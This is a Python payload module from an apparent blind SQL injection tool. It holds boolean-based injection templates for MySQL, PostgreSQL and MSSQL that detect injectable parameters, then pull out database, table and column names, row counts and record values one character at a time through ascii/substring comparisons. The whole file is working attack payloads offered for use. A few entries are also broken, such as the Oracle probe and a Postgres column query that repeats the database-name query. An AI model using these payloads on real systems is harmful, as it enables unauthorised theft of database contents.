#!/usr/bin/env python
#coding: utf-8
###########################################################################
##	This file contain error based queries for each Database implemented  ##
###########################################################################
from random import randint
from random import random
NoAleatorio = int(random()*100)

PayloadsAttempt={ # Theses payloads are used in the SQLi blind detection
				  # And we just used specific functions in which DBMS works
	'Generic':[
				  'and {0}-1={0}-1'.format(randint(2,1001)),
			      'and ascii(substring({0},1,1))={1}'.format(chr(NoAleatorio),ord(chr(NoAleatorio))),

			  ],
	'MySQL':[
				  'and ascii(substring({0},1,1))={1}'.format(chr(randint(48,126)),ord(chr(randint(48,126)))),#'and ascii(substring({0},1,1))={1}'.format(chr(int(random()*100)),ord(chr(int(random()*100)))), # Complex substring nested ascii
				  'and cast("{0}" as signed)=cast("{0}" as signed)'.format(NoAleatorio), # Easy integers conditionals
				  '&& ( select if ( cast((select floor(rand()*100)) as signed)>0,2,null) )',#'&& {0}={0}'.format(int(random()*1000)), # Easy conditionals
				  #Specific queries
				  #'&& (select @@version)',
				  'and ((select LENGTH(DATABASE()))>1)'
				  #'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
				  ],
	'Postgres':[
				  "and ascii(substring(version(),1,1))=ascii('P')",
#				  'and cast({0} as int)=cast({0} as int)'.format(int(random()*1000)),'and cast({0} as integer)=cast({0} as integer)'.format(int(random()*1000)),
				  'and (select current_database())',
				  #'and (select user)',
				  'and trunc(random() * cast(random()*1291 as int) - 1)>0'
				  #'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'

				],
	'Mssql':[
				"and (PI()* SQUARE(rand())) < {0}".format(randint(10,99)),
				#"and (cast('{0}' as integer)) = (cast('{0}' as integer)) and (PI()) like '%3%'".format(randint(1,154)),
				"and CONVERT(varchar, SERVERPROPERTY('productversion')) like '%.%'",
				#"and (atn2(rand(),rand()*rand())) < rand()*{0}".format(randint(10,99)),
				"and (LEN(host_name())>0)",
				#'and {0}={0}'.format(randint(2,1001)),
			],

	'Oracle':['and select @@version from dual']
			}

############################################################ Databases Names #######################################################################################################
										#####################################################################
										##  Se debe iterar el offset para recorrer registro a registro {0} ##
										##  		iterar la posicion de recorte del Caracter {1}         ##
										##			iterar el código ascii del Caracter {2}                ##
										#####################################################################
PayloadsDBnames = {
	#'MySQL': 'and ascii(substring((select schema_name from information_schema.schemata limit 1 offset {0}),{1},1)) < {2}',
	'MySQL':"and ascii(substring((select group_concat(schema_name) from information_schema.schemata),{0},1)) < {1}",
	#'Postgres': 'and ascii(substring((select datname from pg_database limit 1 offset {0}),{1},1)) < {2}',
	'Postgres': "and ascii(substring((select array_to_string(array_agg(datname),',') from pg_database),{0},1)) < {1}",
	'Mssql': "and ascii((select substring((select Substring((select ','+name from Sys.Databases FOR XML PATH('')),2,10000) from Sys.Databases order by name OFFSET 1 ROWS fetch next 1 rows only),{0},1))) < {1}",
	'Oracle': ''
	}
					#######################################################################
					### Variables used to determine limits for extracting database names ##
					#######################################################################

#Length functions
RegisterLength = {
	'MySQL': 'and (select length((select group_concat(schema_name) from information_schema.schemata))) < {0}',
	'Postgres': "and (select length((select array_to_string(array_agg(datname),',') from pg_database))) < {0}",
	'Mssql': "and LEN((select Substring(( select ','+name from Sys.Databases FOR XML PATH('')),2,10000) from Sys.Databases order by name OFFSET 1 ROWS fetch next 1 rows only)) < {0}",
	'Oracle': ''
	}

###################################################################################################################################################################################
############################################################ Tables ###############################################################################################################
#Length functions
TableLength = {
	'MySQL': 'and (select length((select group_concat(table_name) from information_schema.tables where table_schema="{0}"))) < {1}',
	'Postgres': "and (select length((select array_to_string(array_agg(c.relname),',') FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)))) < {1}",
	'Mssql': "and len((substring((select ','+name from {0}..sysobjects where xtype = 'U' for xml path('')),2,10000))) < {1}",
	'Oracle': ''
	}

# (select length((SELECT array_to_string(array_agg(c.relname),',') FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid))))

#select array_to_string(array_agg(c.relname),',') FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)

TablesName={
	'MySQL':'and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="{0}"),{1},1)) < {2}',
	#'Postgres':"and ascii(substring((select array_to_string(array_agg(table_name),',') FROM information_schema.tables where table_schema='public' ),{1},1)) < {2}",
	'Postgres':"and ascii(substring((select array_to_string(array_agg(c.relname),',') FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)),{1},1)) < {2}",
	'Mssql':"and ascii(substring((substring((select ','+name from {0}..sysobjects where xtype = 'U' for xml path('')),2,10000)),{1},1)) < {2}",
	'Oracle':''
	}
###################################################################################################################################################################################


####################################################################################################################################################################################
############################################################ Columns ###############################################################################################################
#Length functions
ColumnLength = {
	'MySQL': 'and (select length((select group_concat(column_name) from information_schema.columns where table_schema="{0}" and table_name="{1}"))) < {2}',
	'Postgres': "and (select length((select array_to_string(array_agg(datname),',') from pg_database))) < {0}",
	'Mssql': "and len((substring((select ','+{0}..syscolumns.name from {0}..syscolumns, {0}..sysobjects where {0}..syscolumns.id={0}..sysobjects.id AND {0}..sysobjects.name='{1}' for xml path('')),2,10000))) < {2}",
	'Oracle': ''
	}

# select group_concat(column_name) from information_schema.columns where table_schema="lux" and table_name="mycal_settings"

ColumnNames={
	'MySQL':'and ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="{0}" and table_name="{1}"),{2},1)) < {3}',
	'Postgres':"",
	'Mssql':"and ascii(substring((substring((select ','+{0}..syscolumns.name from {0}..syscolumns, {0}..sysobjects where {0}..syscolumns.id={0}..sysobjects.id AND {0}..sysobjects.name='{1}' for xml path('')),2,10000)),{2},1)) < {3}",
	'Oracle':''
	}
####################################################################################################################################################################################
#Count functions


numRegisters = {
	'MySQL': 'and (select count(*) from {0}.{1}) < {2}',
	'Postgres': 'and(select count(*) from {0}{1}) < {2}',
	'Mssql': "and (select count(*) from {0}..{1}) < {2}",
	'Oracle': ''
	}

####################################################################################################################################################################################
####################################  Getting records data ####################################
RecordQuerys = {
	'MySQL': 'and ascii(substring((select {0} from {1}.{2} limit 1 offset {3}),{4},1)) < {5}',
	'Postgres': 'and ascii(substring((select {0}::text from {1}{2} limit 1 offset {3}),{4},1)) < {5}',
	'Mssql': "and ascii(substring((select convert(varchar,{0}) from {1}..{2} order by {0} OFFSET {3} ROWS fetch next 1 rows only),{4},1)) < {5}",
	'Oracle': ''
	}

TamrecordQuery = {
	'MySQL': 'and (select length((select {0} from {1}.{2} limit 1 offset {3})) < {4})',
	'Postgres':'and (select length((select {0}::text from {1}{2} limit 1 offset {3})) < {4})',
	'Mssql':"and len((select {0} from {1}..{2} order by {0} OFFSET {3} ROWS fetch next 1 rows only)) < {4}",
	'Oracle':""
	}
